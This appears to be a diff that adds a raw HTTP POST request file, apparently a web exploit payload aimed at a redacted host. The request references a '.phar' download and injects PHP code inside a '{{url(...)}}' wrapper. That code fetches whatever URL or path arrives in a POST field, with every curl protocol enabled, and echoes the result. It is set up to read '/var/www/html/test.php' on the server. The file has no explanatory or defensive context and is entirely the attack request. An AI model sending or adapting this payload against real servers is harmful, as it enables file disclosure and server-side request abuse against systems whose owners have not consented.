@@ -1,0 +1,13 @@
+POST /?down=abcd.phar HTTP/1.1
+Host: xxxxxxxxxxxx
+Content-Type: application/x-www-form-urlencoded
+
+0=/var/www/html/test.php&1={{url(<?php
+$orig = $_POST[0];
+$ch = curl_init($orig);
+curl_setopt($ch, CURLOPT_PROTOCOLS_STR, "all");
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+$data = curl_exec($ch);
+echo $data;
+curl_close($ch);
+)}}
